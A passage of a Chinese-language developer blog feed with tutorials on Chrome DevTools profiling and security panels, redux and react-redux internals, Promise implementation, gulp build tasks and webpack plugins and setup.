仿真CSS媒体类型，查看不同的设备上CSS样式效果，可能的媒体类型选项有print、screen。 可以通过在DevTools上按Cmd+F(Mac)调出查询框，来查看指定时间区域范围内的指定类型的事件，点击Cmd+G(Mac)或者Cmd+Shift+G(Mac)可以按事件发生的顺序来查询。图中查询到了4个红色标记着的Parse HTML事件，点击Cmd+G焦点会在这4个事件移动。 在Overview和Flame Chart上面右键，可以保存和打开记录 Profiles概述当前使用的Chrome最新版为 54.0.2840.71，这个版本的Profiles面板比之前提供的功能更多也更强大，下面是该面板所包含的功能点： Record JavaScript CPU Profile 用于分析网页上的JavaScript函数在执行过程中的CPU消耗信息。 Take Heap Snapshot 创建堆快照用来显示网页上的JS对象和相关的DOM节点的内存分布情况。 Record Allocation Timeline 从整个Heap角度记录内存的分配信息的时间轴信息，利用这个可以实现隔离内存泄漏问题。 Record Allocation Profile 从JS函数角度记录内存的分配信息。 Record JavaScript CPU Profile简介通过选择Record JavaScript CPU Profile，然后点击Start，结合你所要分析的具体场景，你可以重新加载网页，或者在网页上进行交互，甚至什么都不操作。最后点击Stop，完成记录操作。有三种不同的视图可供选择： Chart 按时间先后顺序显示的火焰图。 Heavy(Bottom Up) （自底向上）根据对性能的消耗影响列出所有的函数，并可以查看该函数的调用路径。 Tree(Top Down) (自顶向下) 从调用栈的顶端（最初调用的位置）开始，显示调用结构的总体的树状图情况 我们以Chart视图为例分析一下JS的执行的性能情况： 该视图会以时间顺序展示CPU的性能情况，视图主要分成两块： Overview 整个录制结果的鸟瞰图（概览），柱形条的高度对应了调用堆栈的深度，也就是说柱形条高度越高，调用堆栈的深度越深。 Call Stacks 在录制过程中被调用的函数的深入分析视图（调用堆栈），横轴表示时间，纵轴表示调用栈，自上而下的表示函数的调用情况。也就是说上面的函数调用在它下面的函数。视图中的函数颜色不同于其它的面板，这里面的函数颜色标记是随机显示的。然而相同的函数调用颜色标记是相同的。其中纵轴表示的函数调用堆栈高度仅仅函数的调用嵌套层次比较深，不表示其重要性很高，但是横轴上一个很宽的柱形条则意味着函数的调用需要一个很长的时间去完成，那么你就考虑去做一些优化操作。将鼠标移到Call Stacks中的函数上可以显示函数的名称和时间相关的数据，会提供如下信息： Name 函数名称 Self time 函数的本次调用运行的时间，仅仅包含该函数本身的运行时间，不包含它所调用的子函数的时间。 Total time 函数的本次调用运行的总时间，包含它所调用的子函数的运行时间。 URL 函数定义在文件中所在的位置，其格式为file.js:100，表示函数在file.js文件中的第100行。 Aggregated self time 在这次的录制过程中函数调用运行的总时间，不包含它所调用的子函数的时间。 Aggregated total time 在这次的录制过程中所有的函数调用运行的总时间，包含它所调用的子函数的时间。 Not optimized 如果优化器检测到该函数有潜在的优化空间，那么该函数会被列在这里。 Take Heap Snapshot简介通过创建堆快照可以查看创建快照时网页上的JS对象和DOM节点的内存分布情况。利用该工具你可以创建JS的堆快照、内存分析图、对比堆快照以及定位内存泄漏问题。选中Take Heap Snapshot,点击Take Snapshot按钮即可获取快照，在每一次获取快照前都会自动执行垃圾回收操作。快照最初会存储在渲染进程的内存之中，当我们点击创建快照按钮来查看时才会被传输到DevTools中，当快照被加载到DevTools里面并经过解析之后，在快照标题下方的文字显示的数字就是可访问到的JS对象总的大小。堆快照提供了不同的视角来进行查看： Summary 该视图按照构造函数进行分组，用它可以捕获对象和它们使用的内存情况，对于跟踪定位DOM节点的内存泄漏特别有用。 Comparison 对比两个快照的差别，用它可以对比某个操作前后的内存快照。分析操作前后的内存释放情况以及它的引用计数，便于你确认内存是否存在泄漏以及造成的原因。 Containment 该视图可以探测堆的具体内容，它提供了一个更适合的视图来查看对象结构，有助于分析对象的引用情况，使用它可以分析闭包和进行更深层次的对象分析。 Statistics 统计视图。 Summary视图该视图会显示所有的对象信息，点击其中的一个对象进行展开可查看更详细的实例信息。鼠标移动到某个对象上会显示该对象实例的详情信息。图中的各列的具体含义如下： Constructor 显示所有的构造函数，点击每一个构造函数可以查看由该构造函数创建的所有对象。 Distance 显示通过最短的节点路径到根节点的距离。 Objects Count 显示对象的个数和百分比。 Shallow size 显示由特定的构造函数创建的所有对象的本身的内存总数。 Retained size 显示由该对象及其它所引用的对象的总的内存总数。 Shallow size和Retained size的区别？Shallow size是对象本身占用内存的大小，不包含它所引用的对象。Retained size是该对象本身的Shallow size，加上能从该对象直接或者间接访问到对象的Shallow size之和。也就是说Retained size是该对象被GC之后所能回收到内存的总和。 在展开构造函数，则会列出该函数相关的所有对象实例，可以查看该对象的Shallow size和Retained size，在@符号后面的数字是该对象的唯一标识ID。其中黄色的对象表示它被某个JS所引用，而红色的对象表示由黄色背景色引用被分离开的节点。这些构造函数都代表什么含义呢？ (global property) 全局对象（比如window）和通过它引用的对象之间的中间对象，如果一个对象是由Person构造函数生成并被全局对象所引用，那么它们的引用路径关系就像这样[global] &gt; (global property) &gt; Person。这跟常规的对象之间直接引用相比，采用中间对象主要是考虑性能的原因。全局对象的改变是很频繁的，而非全局变量的属性访问最优化方案对全局变量是不适用的。 (roots) 它们可以是由引擎自己的目标创建的一些引用，这个引擎可以缓存引用的对象，但所有的这些引用都是弱引用，它们不会阻止引用对象被回收。 (closure) 一些函数闭包中的一组对象的引用。 (array, string, number, regexp) 一系属性引用了数组(Array),字符串(String),数字(Number)或正则表达式的对象类型。 HTMLDivElement, HTMLAnchorElement, DocumentFragment等 你的代码中对元素(elements)的引用或者指定的document对象的引用。 Comparison视图通过比较多个快照之间的差异来找出内存泄露的对象，为了验证某个程序的操作不会引起内存泄露（通常会执行一个操作后再执行一个对应的相反操作，比如打开一个文档后再关闭它，应该是没有产生内存泄露问题的），你可以执行如下步骤： 在执行一个操作之前拍一个快照。 执行一个操作，通过你认为可能会引起内存泄露的一次页面交互操作。 执行一个相反的操作。 拍第二个快照，切换到Comparison视图，并与第一个快照进行对比。 切换到Comparison视图之后，就可以看到两个不同的快照之间的差别。 Containment视图该视图本质上就是应用程序的对象结构的“鸟瞰图”，允许你去深入分析函数的闭包，了解应用程序底层的内存使用情况。这个视图提供了多个入口： DOMWindow objects DOMWindow对象，即JS代码全局对象。 Native objects 浏览器原生对象，比如DOM节点，CSS规则。 闭包小建议: 在快照的分析中命名函数的闭包相比匿名函数的闭包更容易区分。Google上提供的例子和图如下： function createLargeClosure() &#123; var largeStr = new Array(1000000).join('x'); var lC = function() &#123; // 匿名函数 return largeStr; &#125;; return lC;&#125; function createLargeClosure() &#123; var largeStr = new Array(1000000).join('x'); var lC = function lC() &#123; // 命名函数 return largeStr; &#125;; return lC;&#125; Statistics视图该视图是堆快照的总的分布统计情况，这个直接上图就可以了： 内存泄露示例:DOM内存泄露可能比你想象的要大，考虑一下下面的例子-什么时候#tree节点被释放掉？var select = document.querySelector;var treeRef = select("#tree");var leafRef = select("#leaf");var body = select("body");body.removeChild(treeRef);//由于treeRef #tree不能被释放treeRef = null;//由于leafRef的间接引用 #tree还是不能被释放leafRef = null;//现在没有被引用，#tree这个时候才可以被释放了 #leaf节点保持着对它的父节点(parentNode)的引用，这样一直递归引用了#tree节点，所以只有当leafRef被设置成null后，#tree下面的整个树节点才有可能被垃圾回收器回收。 Record Allocation Timeline简介该工具是可以帮助你追踪JS堆里面的内存泄漏的另一大利器。选中Record Allocation Timeline按钮，点击Start按钮之后，执行你认为可能会引起内存泄漏的操作，操作之后点击左上角的停止按钮即可。你可以在蓝色竖线上通过缩放来过滤构造器窗格来仅仅显示在指定的时间帧内的被分配的对象。 录制过程中，在时间线上会出现一些蓝色竖条，这些蓝色竖条代表一个新的内存分配，这个新的内存分配都可以会有潜在的内存泄露问题。通过展开对象并点击它的值则可以在Object窗格中查看更多新分配的对象细节。 Record Allocation Profile简介从JS函数角度记录并查看内存的分配信息。点击Start按钮，执行你想要去深入分析的页面操作，当你完成你的操作后点击Stop按钮。然后会显示一个按JS函数进行内存分配的分解图，默认的视图是Heavy (Bottom Up)，该视图会把最消耗内存的函数显示在最顶端。下图是切换到Chart视图时具体的界面，点击任意函数跳转到Sources面板可以查看具体的函数信息。 Application面板简介该面板主要是记录网站加载的所有资源信息，包括存储数据（Local Storage、Session Storage、IndexedDB、Web SQL、Cookies）、缓存数据、字体、图片、脚本、样式表等。 Local Storage 如果你在开发过程中使用了local storage来存储键值对(KVPs)，那么你就可以通过Local Storage窗格来检查、新增、修改、删除这个键值对。 Application Cache 你可以使用Application Cache窗格去查看通过Application Cache API创建的资源。 Frames 将页面上的资源按frame类别进行组织显示。 Frames窗格在上图中可以查看到顶级的top是一个主文档，在top下面是主文档的Fonts、Images、Scripts、Stylesheets等资源。最后一个就是主文件自身。在资源上右击后在弹出菜单选择Reveal in Network Panel，就会跳转到Network面板并定位到该资源的位置。你也可以在Sources面板里面按frame类别来查看资源信息。 Security面板简介通过该面板你可以去调试当前网页的安全和认证等问题并确保您已经在你的网站上正确地实现HTTPS。 HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。HTTPS和HTTP的区别主要为以下四点：① https协议需要到CA申请证书，一般免费证书很少，需要交费。② http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。③ http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。④ http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。 如果网页是安全的，则会显示这样一条消息：This page is secure (valid HTTPS).。通过点击View certificate可以查看main origin的服务器证书信息。点击左侧可以查看指定源的连接和证书详情。如果网页是不安全的，则会显示：This page is not secure.。该面板可以区分两种类型的不安全的页面： 如果被请求的页面通过HTTP提供服务，那么这个主源就会被标记为不安全。 如果被请求的页面是通过HTTPS获取的，但这个页面接着通过HTTP继续从其他来源检索内容，那么这个页面仍然被标记为不安全。这就是所谓的混合内容页面,混合内容页面只是部分受到保护,因为HTTP内容(非加密的内容)可以被嗅探者入侵,容易受到中间人攻击。 点击左侧则提供一个跳转到Network面板视图的链接信息。 中间人攻击(Man-in-the-Middle Attack,”MITM攻击”)是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。 Audits面板简介对当前网页进行网络利用情况、网页性能方面的诊断，并给出一些优化建议。比如列出所有没有用到的CSS文件等。选中Network Utilization、Web Page Performance，点击Run按钮，将会对当前页面进行网络利用率和页面的性能优化作出诊断，并给出相应的优化建议。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[react-redux详解]]></title>
      <url>http://yoursite.com/2016/12/06/react-redux%E8%AF%A6%E8%A7%A3/</url>
      <content type="text"><![CDATA[connect 拥有三个参数mapStateToProps， mapDispatchToProps， mergeProps， options mapStateToProps 外部的数据即state对象转换为UI组件的参数 mapStateToProps是一个函数，执行后应该返回一个对象，这个对象会与组件的props合并。 mapStateToProps会订阅Store，每当state更新的时候，就会自动执行，重新计算UI组件的参数，从而触发UI组件的重新渲染。 mapStateToProps的第一个参数总是state对象，还可以使用第二个参数ownProps，代表UI组件的props对象。 connect方法可以省略mapStateToProps参数，那样的话，UI组件就不会订阅Store，就是说Store的更新不会引起UI组件的更新。 mapDispatchToProps 用户发出的动作变为Action对象，从UI组件传出去 如果作为函数会得到dispatch和ownProps两个参数，mapDispatchToProps执行后应该返回一个对象，这个对象会与组件的props合并。 如果mapDispatchToProps是一个对象，会先用bindActionCreators处理，之后合并到props中。 如果你省略这个mapDispatchToProps参数，默认情况下，dispatch会注入到你的组件props中。 mergeProps 拥有三个参数stateProps，dispatchProps，ownProps 如果指定了这个参数，mapStateToProps与mapDispatchToProps的执行结果和组件自身的props将传入到这个回调函数中。该回调函数返回的对象将作为props传递到被包装的组件中。 options pure = true: 如果为true，connector将执行shouldComponentUpdate并且浅对比mergeProps的结果，避免不必要的更新，前提是当前组件是一个“纯”组件，它不依赖于任何的输入或state而只依赖于props和Redux store的state。默认值为true。 withRef = false: 如果为true，connector会保存一个对被包装组件实例的引用，该引用通过 getWrappedInstance()方法获得。默认值为false。 组件Provider在根组件外面包了一层，这样一来，App的所有子组件就默认都可以拿到state了。它的原理是React组件的context属性，请看源码:class Provider extends Component &#123; getChildContext() &#123; return &#123; store: this.props.store &#125;; &#125; render() &#123; return this.props.children; &#125;&#125;Provider.childContextTypes = &#123; store: React.PropTypes.object&#125; 组件可以获取store如下：const &#123; store &#125; = this.context;this.unsubscribe = store.subscribe(() =&gt;&#123; //todo something&#125;);组件名.contextTypes = &#123;//必须加，否则context为空 store: React.PropTypes.object&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[redux中间件]]></title>
      <url>http://yoursite.com/2016/12/05/redux%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      <content type="text"><![CDATA[redux-thunkreturn function (next) &#123; return function (action) &#123; if (typeof action === 'function') &#123; return action(dispatch, getState, extraArgument); &#125; return next(action); &#125;;&#125;; 加了一个对action是函数的特殊处理！ redux-logger打印各种信息]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[redux详解]]></title>
      <url>http://yoursite.com/2016/12/05/redux/</url>
      <content type="text"><![CDATA[createStore这个函数有三个参数分别是reducer（function），preloadedState和enhancer(可选，function)，如果enhancer存在，那么就会走下面的逻辑：return enhancer(createStore)(reducer, preloadedState); 一旦使用中间件就会使用上面的函数，store就会在这个函数中生成！如果preloadedState是函数，enhancer是undefined，两者的值会被调换！enhancer可以看做是一种自定义的处理方式！最后返回dispatch、subscribe、getState和replaceReducer这四个函数，state和Listener都存在于createStore内部，作为闭包的一个引用！ subscribe绑定监听事件，把所有的事件函数都存放于nextListeners中，并且返回一个解绑事件的函数。 dispatchaction必须是一个对象，且type不能是undefined，执行时会把当前的state和action作为参数传入reducer中，生成新的state,此时也会执行nextListeners收集到的事件函数！注意：dispatch会在createStore初始化时执行一次！ getState获取当前的state replaceReducer初始化了createStore之后，提供一次更换reducer的机会。 bindActionCreatorsbindActionCreator处理单个actionCreator,此时actionCreator必须是函数！function bindActionCreator(actionCreator, dispatch) &#123; return function () &#123; return dispatch(actionCreator.apply(undefined, arguments)); &#125;;&#125; bindActionCreators也有这两个参数actionCreators和dispatch，一般返回一个触发dispatch的对象，此处直接看代码吧！if (typeof actionCreators === 'function') &#123; return bindActionCreator(actionCreators, dispatch);&#125;var keys = Object.keys(actionCreators);var boundActionCreators = &#123;&#125;;for (var i = 0; i &lt; keys.length; i++) &#123; var key = keys[i]; var actionCreator = actionCreators[key]; if (typeof actionCreator === 'function') &#123; boundActionCreators[key] = bindActionCreator(actionCreator, dispatch); &#125;&#125; compose1、不传参数，返回一个函数，此函数特点是直接返回一个传入的参数2、传入一个参数，直接返回这个参数3、传入不少于两个的参数，参数在函数内部会转化为一个数组，此函数会返回另外一个函数：return function () &#123; return rest.reduceRight(function (composed, f) &#123; return f(composed); &#125;, last.apply(undefined, arguments));&#125; 此函数可以当做一种数据流使用，要求compose传入的参数都是函数，那么上面这个函数的参数传入compose最后一个函数参数中，执行的结果再传入compose倒数第二个函数参数中，执行的结果再传入倒数第三个…以此类推，最后获得结果！ applyMiddlewareapplyMiddleware参数是传入的一些中间件，函数内部嵌套了两层函数用于生成store，同时也生成了一个对象：var middlewareAPI = &#123; getState: store.getState, dispatch: function dispatch(action) &#123; return _dispatch(action); &#125;&#125;; 这个对象会作为每个中间件的参数，使每个中间件都拥有store的getState和dispatch，执行后重新生成一个数组chain，chain会作为参数传入compose中，compose最后一个参数的参数是store.dispatch，最后返回一个结果_dispatch，用这个_dispatch替换store的dispatch! 重点：在初始化时，compose是从后向前执行，后一个中间件成为上一个中间件的next，但是在执行时是从前向后，当action满足第一个中间件的要求时就执行，不满足要求就把action传给next，next就是第二个中间件，以此类推。 注意：中间件一般是只修改dispatch！ combineReducers参数是一个对象reducers，会把其中值是函数的k-v对提取出来，重新生成一个对象finalReducers，处理过程直接看代码：var hasChanged = false;var nextState = &#123;&#125;;for (var i = 0; i &lt; finalReducerKeys.length; i++) &#123; var key = finalReducerKeys[i]; var reducer = finalReducers[key]; var previousStateForKey = state[key]; var nextStateForKey = reducer(previousStateForKey, action); nextState[key] = nextStateForKey; hasChanged = hasChanged || nextStateForKey !== previousStateForKey;&#125;return hasChanged ? nextState : state; 一旦nextStateForKey发生变化，就会返回新的state！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Promise实现逻辑]]></title>
      <url>http://yoursite.com/2016/11/27/Promise-logic/</url>
      <content type="text"><![CDATA[我们都知道promise可以很好的解决异步嵌套的问题，使代码更有可读性，但是一直没去研究promise的实现逻辑，最近看了一下es6-promise源码，那么下面简单介绍一下实现思想！ PromisePromise处理流程如下：一般的用法都会new一个promise对象：new Promise(function(resolve,reject)&#123; if(ok)&#123; resolve(value) &#125;else&#123; reject(reason) &#125;&#125;) Promise构造函数只有一个参数，类型为function，而此函数有两个参数也是函数类型即resolve和reject，他们两个是源码中定义的。拒绝时的状态为reject就不说了，resolve是成功时的处理函数，他会根据value进行处理 value是普通的值，他就会挂在到Promise对象的_result属性上 value是Promise对象，那么他就会把value的_result值赋值给外层的Promise对象的_result属性 value是对象且带有then函数属性，那么value就会被当做一个类似Promise的对象，运行此对象then的结果赋值给Promise对象的_result属性上 挂在Promise对象的_result属性上的值是为了传入后续的then函数中 ThenThen处理流程如下：Then有两个函数参数，使用哪一个完全依据上个Promise运行的状态。Then并不是在主线程开始运行的，在源码中专门有一个数组用于收集Then的处理。 每个Then的处理都会单独new一个新的Promise对象 第一个Then会传入数组，并启动异步执行开关 其余的Then处理会挂载到上一个Promise对象的属性上 通过遍历，当一个Then处理完成，下一个Then的处理和上一个Then处理的值就会存入数组中并且开始遍历执行，直到处理完所有的Then 在处理Then过程中value也会按照Promise方式处理 Promise.allall的处理思想和以上一致，唯一的区别是会遍历传入的数组，对每一个进行处理，在处理完全后，把值传入Then中，只不过此时的value是数组罢了 polyfill其作用是检测当前环境存不存在Promise，如果不存在就会引入源码中的Promise。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[next主题vendors报错404]]></title>
      <url>http://yoursite.com/2016/11/14/nextThemeProblemRepair/</url>
      <content type="text"><![CDATA[本地预览没问题，deploy后主页显示大面积空白最近小伙伴上传博客，发现主页显示大面积空白，打开控制台后发现vendors目录下面的js各种404，但是在github上文件是存在的，究其原因可能是GitHub Pages过滤掉了source/vendors目录的访问。 解决办法首先修改source/vendors为source/lib，然后修改_config.yml，将_internal:vendors修改为_internal:lib然后修改next底下所有引用source/vendors路径为source/lib。这些地方可以通过文件查找找出来。主要集中在这几个文件中。1. Hexo\themes\next.bowerrc 2. Hexo\themes\next.gitignore 3. Hexo\themes\next.javascript_ignore 4. Hexo\themes\next\bower.json 。修改完毕后，刷新重新g一遍就ok啦。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一个基于自身业务的前端简单生产工具]]></title>
      <url>http://yoursite.com/2016/11/13/gulp-develop-tool/</url>
      <content type="text"><![CDATA[背景目前网上有众多的构建工具，比如webpack、gulp、grunt还有fis等等，除了grunt，小生都有尝试过。先前本司一众大神推广过fis，进行过很多期讲座培训，由于公司的小白比较多，显然效果不太好，原因如下： 很多人仓促去听讲座，根本没看文档，所以听的云里雾里 fis相对比较笨重，有一定的学习成本，配置眼花缭乱 最最主要的是需求，习惯于用各种小工具搞定生产中的环节，还不容易出问题，而且效率还不错，fis要是出问题了，可能要调试半天，对于小白来说很头疼 大神们陶醉于技术的钻研，却忽略了小白们的接收能力，所有的讲座都有一个特点，就是太泛，无法深入每个细节点。大神们所有的配置都是一路畅通，但是到了小白这里各种报错，大神们认为小白应该自己看，那小白们很有可能就不看了！ 那么作者选择gulp作为构建化工具有以下几点原因： gulp文档很少，语法简单，对于我们小白来说，或多或少都会点，不见得会写，至少都能看得懂 gulp很轻巧，开源插件众多，小白们瞜一眼gulp文件，基本就知道各种task是干什么的，加以配置注释，那么自己配置应该就没什么问题了，再熟悉一点自己都可以去拓展 配置gulpfile.js创建目录搬砖首先要有文件夹，所以这里就按照小生的业务来建立文件夹目录，如下： html src css js img dist css js img mock tool doc html文件夹存放html文件，src为开发目录，包括css、js和img，因为这三者都需要经过处理，所以处理后会放入dist目录； mock是模拟数据存放的目录，一般开发，fe需要后端提供一些接口，但是往往因为开发速度不一样，rd不能及时提供，所以fe可以起一个服务，把模拟数据放在此处； tool可以存放自己的一些小工具用于其他的开发功能 doc存放需求文档等文档类的文件//创建开发目录gulp.task('g-init', function() &#123; var dirs = [dirPaths.html, dirPaths.css.src, dirPaths.js.src, dirPaths.doc, dirPaths.img.src, dirPaths.tool]; dirs.forEach(dir =&gt; &#123; mkdirp.sync(dir); &#125;)&#125;); 创建目录采用了mkdirp这个插件，路径都写在了dirs这个数组内，运行命令：gulp g-init 就可以完成以上目录结构的创建，task的名字可以自己随意起！ 处理css//处理sass文件gulp.task('g-css', function() &#123; return gulp.src(dirPaths.css.src + '/**/*.scss') .pipe(sourcemaps.init())//生成map .pipe(sass(&#123;//编译sass文件 outputStyle: 'compressed'//压缩 &#125;).on('error', sass.logError)) .pipe(autoprefixer())//添加前缀 .pipe(sourcemaps.write()) .pipe(rename(&#123;&#125;))//重命名 .pipe(gulp.dest(dirPaths.css.dist));&#125;); 看见以上代码的注释就应该知道他们是做什么的，也有一些人可能没有使用sass，那么只要自己稍微改动一下应该就没问题了 处理img//处理图片gulp.task('g-image', function() &#123; return gulp.src(dirPaths.img.src + '/**/*') .pipe(imagemin())//压缩 .pipe(gulp.dest(dirPaths.img.dist))&#125;); 这个命令只是对图片做了压缩，采用了gulp-imagemin插件，效果还行，如果不满意压缩效果，自己可以再试试其他的插件 处理整个style//处理css和imggulp.task('g-style', ['g-css', 'g-image'], function() &#123; gulp.src(dirPaths.css.dist + '/**/*.css') .pipe(spriter(spriteConfig))&#125;); 我这里把css和img都归为style，这个任务的功能就是生成和替换雪碧图，前提是先运行g-css和g-image，在把处理好的css和img文件放入dist目录下，再对他们做雪碧图的处理。spriter是我自己改装的插件gulp-cross-spriter的引用，具体功能和配置都有很详细的说明，可以点进去凑凑。多说一句，此插件readme全文都是中文，主要是为方便自己书写，也方便同胞查阅，如果要说我英语不好，我也承认，我确实对英文文档的某些语句理解挠头，不过对于英语过六级，经过研究生生涯洗礼的我来说搞一篇英文的说明文档，问题应该不大。 处理js//处理js文件gulp.task('g-js', function() &#123; gulp.src(dirPaths.js.src + '/**/*.js') .pipe(jshint())//语法检查 .pipe(jshint.reporter(stylish))//控制台报错输出的样式 .pipe(uglify()) //压缩，有一定的语法检测能力，如果语法错的太离谱，这里可能会报错 .pipe(gulp.dest(dirPaths.js.dist));&#125;); 这里对js做了语法检查和压缩，当前目录需要配置.jshintrc文件，具体相关配置请查阅文档 实时刷新gulp自带的监听功能单一，这里借助gulp-connect起一个本地的服务，可以做到html文件的试试刷新（仅仅html文件）//启动服务器gulp.task('g-connect', function() &#123; connect.server(&#123; root: serverConfig.root, //设置根目录 livereload: serverConfig.livereload, //启动实施监控 port: serverConfig.port, //设置端口 name: serverConfig.name //设置服务器名字 &#125;);&#125;);//重新加载gulp.task('g-reload', function() &#123; gulp.src(dirPaths.devPath + '/**/*.*') .pipe(connect.reload())&#125;)//监听gulp.task('g-watch', function() &#123; //watch 只能监听现存的文件对于新建文件 无法监听 gulp.watch(dirPaths.html + '/**/*.html', ['g-reload']); gulp.watch(dirPaths.js.src + '/**/*.js', ['g-reload', 'g-js']); gulp.watch(dirPaths.css.src + '/**/*.scss', ['g-reload', 'g-style']);&#125;); 那么本地服务配合watch监听，就可以在代码保存后试试刷新页面，但是监听只能监听存在的文件，对于后来新建的文件必须重新启动才行！ 默认taskgulp.task('default', ['g-connect', 'g-watch', 'g-openbrowser']); 这样只要一个gulp命令就可以建立本地服务，启动监听，并且帮你打开页面！ 综述其实开发就两条命令：gulp g-init gulp 一个是建立文件夹，一个是监听！这里有个完整的栗子，可以凑凑，我把配置都放在了一个文件里面，因为代码量并不是很多，我只想让开发者拷贝更少的文件，如果想要把配置都放在另外的文件下，也是莫问题滴！我这个目录下写了很多gulp插件的栗子，方便小白查阅！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[webpack.plugin]]></title>
      <url>http://yoursite.com/2016/10/18/webpack-plugin/</url>
      <content type="text"><![CDATA[bell-on-bundler-error-pluginbell-on-bundler-error-plugin会通知您在打包构建过程中的错误function BellOnBundlerErrorPlugin () &#123; &#125;BellOnBundlerErrorPlugin.prototype.apply = function(compiler) &#123; if (typeof(process) !== 'undefined')&#123; compiler.plugin('done', function(stats) &#123; if (stats.hasErrors()) process.stderr.write('\x07') &#125;) compiler.plugin('failed', function(err) &#123; process.stderr.write('\x07') &#125;) &#125;&#125;module.exports = BellOnBundlerErrorPlugin CommonsChunkPluginWebpack中将打包后的文件都称之为“Chunk”。这个插件可以将多个打包后的资源中的公共部分打包成单独的文件。智能提取公共部分来方便多页面之间进行复用!先看一个简单的例子，运行一下，从下图可知，公共部分已经被独立出来，在html必须先被加载！提取的公共部分的common，还可以再和其他文件继续提取common，来看一个稍微复杂的例子,在index.html中改变js的引用文件，就可以看见效果！ page5.html: commons.js, ap1.js page4.html: commons.js, ap2.js page3.html: p3.js page2.html: commons.js, admin-commons.js, p1.js page1.html: commons.js, admin-commons.js, p2.js extract-text-webpack-plugin独立出css样式，单独打包CSS，通过link引入样式而不是放在style标签内 ExtractTextPlugin.extract([notExtractLoader], loader, [options]) noExtractLoader可选参数，未提取的css会被这个loader处理。loader列表，将资源转换为导出的css module，必选ExtractTextPlugin.extract会在这个loader列表前插入一个loader，并且最后会执行loader列表所返回的module,本人尝试这个插件，无论同一个入口中引入多少css文件，都被打包成一个css，不同的入口会单独打包一个，看一个例子，在这个例子中还增加了压缩js的功能。 webpack.DefinePlugin可以为js定义变量，这个变量是webpack自动生成插入到我们的代码中的new webpack.DefinePlugin(&#123; 'process.env': &#123; NODE_ENV:JSON.stringify(env) &#125;, __DEV__:dev&#125;) DefinePlugin中可以传入一个对象，对象的key会被定义在我们的代码中，对应的value，就是key在代码中对应的值，值得注意的是字符串需要JSON.stringify包裹，否则这个值在代码中会生成一个变量，而不是字符串，导致代码报错，看个例子！ UglifyJsPluginnew webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; warnings: false//去掉压缩过程中的提示 &#125;, beautify: true,//是否格式化 mangle: &#123; except: ['$super', '$', 'exports']//可以指定哪些变量name不混淆， &#125;, output: &#123; comments: false//是否保留注释,默认为false &#125;&#125;) 上面一些小的功能小生都加了注释，但是是否混淆小生没有找到开关! HotModuleReplacementPluginHot Module Replacement（HMR）也是webpack里很有用的一个插件，它允许你在修改组件代码后，自动刷新实时预览修改后的效果。请看详情 OccurenceOrderPlugin为组件分配ID，通过这个插件webpack可以分析和优先考虑使用最多的模块，并为它们分配最小的ID NoErrorsPlugin允许错误不打断程序]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[webpack.learning]]></title>
      <url>http://yoursite.com/2016/10/17/webpack-learning/</url>
      <content type="text"><![CDATA[安装Node作为前端，没用过Node，只能说是个十足的菜鸟！ 全局安装webpack$ npm install webpack -g 运行例子进入文件，首先运行 npm install，安装所需要的依赖，然后可以打开example1.webpack文件夹，运行下面的命令：$ webpack src/index.js dist/index.js 之后打开index.html就可以看见运行效果！ 生成配置文件webpack.config.js查看第二个例子,进入文件，只要运行如下命令即可，$ webpack 此时webpack就会自动运行这个配置文件,如果想配置多个config文件，用如下命令：$ webpack --config webpack.config.prod.js 编译React安装一下插件$ npm install babel-loader babel-core babel-preset-es2015 babel-preset-stage-0 babel-preset-react babel-polyfill --save-dev$ npm install react react-dom --save babel-core是babel6的基础模块,babel-loader和babel-preset-es2015用于编译ES6语法的js，babel-preset-stage-0主要是应对ES7语法标准的插件，babel-preset-react用于编译react。先看一个栗子 babel-polyfillBabel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如Object.assign）都不会转码。举例来说，ES6在Array对象上新增了Array.from方法。Babel就不会转码这个方法。如果想让这个方法运行，必须使用babel-polyfill，为当前环境提供一个垫片。 引入代码：import 'babel-polyfill';// 或者require('babel-polyfill'); webpack打包css安装如下几个loader：$ npm install style-loader css-loader sass-loader --save-dev style-loader 将css插入到页面的style标签 css-loader 是处理css文件中的url()等 sass-loader 是将sass文件编译成css webpack-dev-server安装：$ npm install webpack-dev-server -g 启动：$ webpack-dev-server --content-base ./ –content-base ./ 参数表示将当前目录作为 server 根目录。 命令启动过后，会在 8080 端口启动一个 http 服务，通过访问 http://localhost:8080/index.html 可以访问 index.html 内容。此时修改内容，刷新页面，页面内容的改变并没有呈现出来，因为webpack-dev-server的打包结果是放在内存中的，此时可以在webpack.config.js的output中加上publicPath，现在再刷新页面就可以看见效果了！ 实时刷新1、Iframe 模式 修改访问的路径： http://localhost:8080/index.html -&gt; http://localhost:8080/webpack-dev-server/index.html 。这个时候每次修改代码，打包完成过后都会自动刷新页面。 不需要额外配置，只用修改路径 应用被嵌入了一个 iframe 内部，页面顶部可以展示打包进度信息 因为 iframe 的关系，如果应用有多个页面，无法看到当前应用的 url 信息 2、inline 模式 启动 webpack-dev-server 的时候添加 –inline 参数 需要添加 –inline 配置参数 没有顶部信息提示条，提示信息在控制台中展现 热加载webpack-dev-server 还提供了模块热加载的方式，在不刷新浏览器的条件下，应用最新的代码更新，启动 webpack-dev-server 的时候添加 –inline –hot 参数就可以体验。$ 